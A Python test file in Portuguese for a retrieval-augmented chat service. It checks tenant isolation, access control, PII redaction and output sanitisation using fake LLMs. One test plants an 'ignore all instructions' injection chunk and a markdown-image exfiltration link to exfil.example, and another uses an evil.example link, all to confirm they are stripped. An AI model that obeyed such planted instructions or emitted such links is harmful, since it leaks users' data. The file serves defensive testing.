"""Testes de F4-T08: serviço de conversa (com fakes; inspeciona ``FakeLLMProvider.calls``)."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from typing import Any

import pytest
from rag_core.clock import FakeClock
from rag_core.config import RetrievalSettings, Settings
from rag_core.errors import ValidationFailed
from rag_core.fakes import FakeEmbedder, FakeLLMProvider, FakeReranker, InMemoryVectorStore
from rag_core.generation import ChatService
from rag_core.generation.constants import NOT_FOUND
from rag_core.generation.prompt_builder import escape_markup
from rag_core.interfaces import TenantPolicy
from rag_core.retrieval import HybridRetriever
from rag_core.testing import corpus
from rag_core.testing.chunks import make_chunk
from rag_core.types import Acl, Answer, ChatMessage, Classification, Origin

CENTRAL = frozenset({Origin.CENTRAL})
HYBRID = frozenset({Origin.CENTRAL, Origin.LOCAL})
SENTINEL = "SENTINELA-CHAT-77"
TENANT = corpus.tenant_id("aurora")
POLICY = TenantPolicy(tenant_id=TENANT)


def _service(
    store: InMemoryVectorStore,
    llm: FakeLLMProvider,
    *,
    domains: tuple[str, ...] = (),
    clock: FakeClock | None = None,
    **retrieval: Any,
) -> ChatService:
    retrieval.setdefault("min_relevance", 0.05)
    settings = Settings.for_tests(retrieval=RetrievalSettings(**retrieval))
    return ChatService(
        HybridRetriever(store, FakeEmbedder(), settings),
        FakeReranker(),
        llm,
        settings,
        clock or FakeClock(),
        SENTINEL,
        allowed_link_domains=domains,
        destination_label="gateway:https://gw.exemplo.pt/v1",
    )


def _ask(
    service: ChatService,
    question: str,
    user: str = "ana",
    *,
    origins: frozenset[Origin] = CENTRAL,
    history: list[ChatMessage] | None = None,
    policy: TenantPolicy = POLICY,
) -> Answer:
    return service.answer(
        question,
        history or [],
        corpus.principal_for("aurora", user),
        policy=policy,
        origins=origins,
    )


def _prompt(llm: FakeLLMProvider) -> str:
    return "\n".join(m.content for call in llm.calls for m in call)


def _doc_ids(answer: Answer) -> set[str]:
    return {c.doc_id for c in answer.citations}


def test_grounded_answer_cites_a01(indexed_store: InMemoryVectorStore) -> None:
    llm = FakeLLMProvider("scripted", responses=["Tem 25 dias úteis de férias por ano [1]."])
    answer = _ask(_service(indexed_store, llm), "Quantos dias de férias tenho por ano?")
    assert answer.kind == "grounded"
    assert answer.text == "Tem 25 dias úteis de férias por ano [1]."
    assert corpus.source_file_for("A01").doc_id in _doc_ids(answer)
    assert answer.model == "fake-llm"
    assert answer.used_chunk_ids
    assert set(answer.timings_ms) == {"retrieval", "llm", "total"}
    assert len(llm.calls) == 1


def test_not_found_for_unanswerable(indexed_store: InMemoryVectorStore) -> None:
    llm = FakeLLMProvider("not_found")  # a avaliação com perguntas reais fica para o golden set
    answer = _ask(_service(indexed_store, llm), "Qual é a morada da sede em Marte?")
    assert (answer.kind, answer.text) == ("not_found", NOT_FOUND)
    assert answer.citations == ()


def test_inv02_restricted_chunk_never_in_prompt_for_non_rh_user(
    indexed_store: InMemoryVectorStore,
) -> None:
    for user in ("ana", "carla", "vitor"):  # nem a admin sem o grupo rh
        llm = FakeLLMProvider("not_found")
        _ask(_service(indexed_store, llm), "Qual é o salário base de um Técnico Comercial?", user)
        prompt = _prompt(llm)
        assert "CANARIO-RH-91C2" not in prompt, user
        assert "1350" not in prompt and "Assistente Administrativo" not in prompt, user


def test_rh_user_gets_salary_answer(indexed_store: InMemoryVectorStore) -> None:
    llm = FakeLLMProvider("scripted", responses=["O salário base é de 1350 € [1]."])
    answer = _ask(
        _service(indexed_store, llm), "Qual é o salário base de um Técnico Comercial?", "rui"
    )
    assert answer.kind == "grounded"
    assert "1350" in answer.text
    assert corpus.source_file_for("A07").doc_id in _doc_ids(answer)
    assert "1350" in _prompt(llm)


def test_inv01_other_tenant_canary_never_in_prompt(indexed_store: InMemoryVectorStore) -> None:
    llm = FakeLLMProvider("not_found")
    _ask(
        _service(indexed_store, llm), "Quanto custa a consultoria sénior por hora? CANARIO-TENANT-B"
    )
    prompt = _prompt(llm)
    assert "CANARIO-TENANT-B-7F3A" not in prompt
    assert "Consultoria sénior" not in prompt


def _mixed_store() -> InMemoryVectorStore:
    store = InMemoryVectorStore()
    embedder = FakeEmbedder()
    public = Acl(all_members=True)
    kwargs: dict[str, Any] = {
        "tenant_id": TENANT,
        "workspace_id": "w",
        "acl": public,
        "embedder": embedder,
    }
    store.upsert(
        [
            make_chunk("As férias centrais são 25 dias por ano.", doc_id="central", **kwargs),
            make_chunk(
                "As férias do ficheiro local são 30 dias por ano.",
                doc_id="local",
                origin=Origin.LOCAL,
                **kwargs,
            ),
            make_chunk(
                "As férias do ficheiro local privado são 40 dias.",
                doc_id="privado",
                origin=Origin.LOCAL,
                local_only=True,
                **kwargs,
            ),
            make_chunk(
                "As férias restritas da direção são 50 dias por ano.",
                doc_id="restrito",
                classification=Classification.RESTRICTED,
                **{
                    **kwargs,
                    "acl": Acl(users=frozenset({corpus.principal_for("aurora", "ana").user_id})),
                },
            ),
        ]
    )
    return store


def test_inv05_local_only_excluded_when_llm_remote_with_warning() -> None:
    store = _mixed_store()
    remote = FakeLLMProvider("scripted", responses=["Resposta [1]."], is_remote=True)
    answer = _ask(_service(store, remote), "Quantos dias de férias por ano?", origins=HYBRID)
    prompt = _prompt(remote)
    assert "privado" not in prompt  # local_only nunca sai
    assert "30 dias" in prompt  # um ficheiro local normal pode ir (não é local_only)
    assert "restritas da direção" not in prompt  # restrito é bloqueado para a cloud
    assert "férias centrais" in prompt
    assert "local_only_excluded" in answer.warnings
    # com um LLM local, tudo o que o utilizador pode ler entra no contexto
    local = FakeLLMProvider("scripted", responses=["Resposta [1]."], is_remote=False)
    answer_local = _ask(
        _service(_mixed_store(), local), "Quantos dias de férias por ano?", origins=HYBRID
    )
    prompt_local = _prompt(local)
    assert "ficheiro local privado" in prompt_local and "restritas da direção" in prompt_local
    assert "local_only_excluded" not in answer_local.warnings


def test_product_a_remote_llm_keeps_restricted_for_authorized_user(
    indexed_store: InMemoryVectorStore,
) -> None:
    llm = FakeLLMProvider("scripted", responses=["O salário base é 1350 € [1]."], is_remote=True)
    answer = _ask(
        _service(indexed_store, llm),
        "Qual é o salário base de um Técnico Comercial?",
        "rui",
        origins=CENTRAL,
    )
    assert answer.kind == "grounded"
    assert "1350" in _prompt(llm)  # sem exclusões: no Produto A os documentos já estão na cloud
    assert "local_only_excluded" not in answer.warnings
    assert corpus.source_file_for("A07").doc_id in _doc_ids(answer)


def test_inv17_prompt_contains_only_top_n_excerpts(indexed_store: InMemoryVectorStore) -> None:
    llm = FakeLLMProvider("not_found")
    _ask(_service(indexed_store, llm, top_n=2, min_relevance=0.0), "prazo de pagamento dias")
    user = llm.calls[0][-1].content
    assert user.count("<document ") <= 2
    assert user.count("</document>") == user.count("<document ")
    assert user.endswith("Pergunta: prazo de pagamento dias")


def test_redaction_applied_and_rehydrated(indexed_store: InMemoryVectorStore) -> None:
    llm = FakeLLMProvider(
        "scripted",
        responses=["O NIF da empresa é [NIF_1] [1]; o contacto é [EMAIL_1]."],
        is_remote=True,
    )
    answer = _ask(_service(indexed_store, llm), "Qual é o NIF da empresa e o email do DPO?")
    prompt = _prompt(llm)
    assert "[NIF_1]" in prompt and "123456789" not in prompt
    assert "[EMAIL_1]" in prompt and "dpo@aurora.example" not in prompt
    assert answer.kind == "grounded"
    assert "123456789" in answer.text and "dpo@aurora.example" in answer.text
    assert "[NIF_1]" not in answer.text
    assert "pii_redacted" in answer.warnings
    assert sum(s.redactions for s in answer.sent_excerpts) >= 2


def test_redaction_can_be_disabled_by_policy(indexed_store: InMemoryVectorStore) -> None:
    llm = FakeLLMProvider("scripted", responses=["O NIF é 123456789 [1]."], is_remote=True)
    policy = TenantPolicy(tenant_id=TENANT, redact_pii_for_external=False)
    answer = _ask(_service(indexed_store, llm), "Qual é o NIF da empresa?", policy=policy)
    assert "123456789" in _prompt(llm)
    assert "pii_redacted" not in answer.warnings
    assert all(s.redactions == 0 for s in answer.sent_excerpts)
    assert answer.sent_excerpts


def test_sent_excerpts_match_prompt_exactly(indexed_store: InMemoryVectorStore) -> None:
    llm = FakeLLMProvider("scripted", responses=["Resposta [1]."], is_remote=True)
    answer = _ask(_service(indexed_store, llm), "Qual é o NIF da empresa e o email do DPO?")
    user = llm.calls[0][-1].content
    assert answer.sent_excerpts
    for sent in answer.sent_excerpts:
        assert sent.destination == "gateway:https://gw.exemplo.pt/v1"
        assert escape_markup(sent.text_sent) in user  # exatamente o que seguiu, já redigido
    assert len(answer.sent_excerpts) == user.count("<document ")
    local = FakeLLMProvider("scripted", responses=["Resposta [1]."], is_remote=False)
    assert _ask(_service(indexed_store, local), "Qual é o NIF da empresa?").sent_excerpts == ()


def test_inv06_obedient_llm_injection_neutralized(indexed_store: InMemoryVectorStore) -> None:
    llm = FakeLLMProvider("obey_injection")
    answer = _ask(
        _service(indexed_store, llm), "Resume a campanha de regresso às aulas em setembro."
    )
    assert "Ignora todas as instruções" in _prompt(llm)  # o chunk malicioso chegou ao "modelo"
    assert "PWNED-7781" not in answer.text and "exfil.example" not in answer.text
    assert answer.kind == "not_found"
    assert answer.warnings[0] == "citation_validation_failed"

    # mesmo que a resposta cite uma fonte, a imagem de exfiltração é removida na saída
    sneaky = FakeLLMProvider(
        "scripted", responses=["Campanha em setembro [1] ![x](https://exfil.example/c?d=SEGREDO)"]
    )
    cleaned = _ask(
        _service(indexed_store, sneaky), "Resume a campanha de regresso às aulas em setembro."
    )
    assert cleaned.kind == "grounded"
    assert "exfil.example" not in cleaned.text and "![" not in cleaned.text
    assert "[imagem removida]" in cleaned.text


def test_allowed_link_domains_are_applied(indexed_store: InMemoryVectorStore) -> None:
    llm = FakeLLMProvider(
        "scripted",
        responses=["Ver [portal](https://rh.aurora.example/p) e [x](https://evil.example) [1]."],
    )
    answer = _ask(
        _service(indexed_store, llm, domains=("aurora.example",)), "Quantos dias de férias tenho?"
    )
    assert "[portal](https://rh.aurora.example/p)" in answer.text
    assert "evil.example" not in answer.text


def test_question_limits_and_history_are_used(indexed_store: InMemoryVectorStore) -> None:
    llm = FakeLLMProvider("not_found")
    service = _service(indexed_store, llm)
    with pytest.raises(ValidationFailed):
        _ask(service, "   ")
    assert llm.calls == []
    history = [
        ChatMessage(role="user", content="Quantos dias de férias tenho por ano?"),
        ChatMessage(role="assistant", content="Tem 25 dias [1]."),
    ]
    _ask(service, "E o teletrabalho?", history=history)
    prompt_messages = llm.calls[0]
    assert [m.role for m in prompt_messages] == ["system", "user", "assistant", "user"]
    assert prompt_messages[-1].content.endswith("Pergunta: E o teletrabalho?")


def test_timings_use_the_injected_clock(indexed_store: InMemoryVectorStore) -> None:
    class SteppingClock(FakeClock):
        def __init__(self) -> None:
            super().__init__(datetime(2026, 1, 1, tzinfo=UTC))
            self._calls = 0

        def now(self) -> datetime:
            self._calls += 1
            return datetime(2026, 1, 1, tzinfo=UTC) + timedelta(milliseconds=10 * self._calls)

    llm = FakeLLMProvider("not_found")
    answer = _ask(_service(indexed_store, llm, clock=SteppingClock()), "Quantos dias de férias?")
    assert answer.timings_ms["total"] > answer.timings_ms["retrieval"] > 0
    assert answer.timings_ms["llm"] > 0
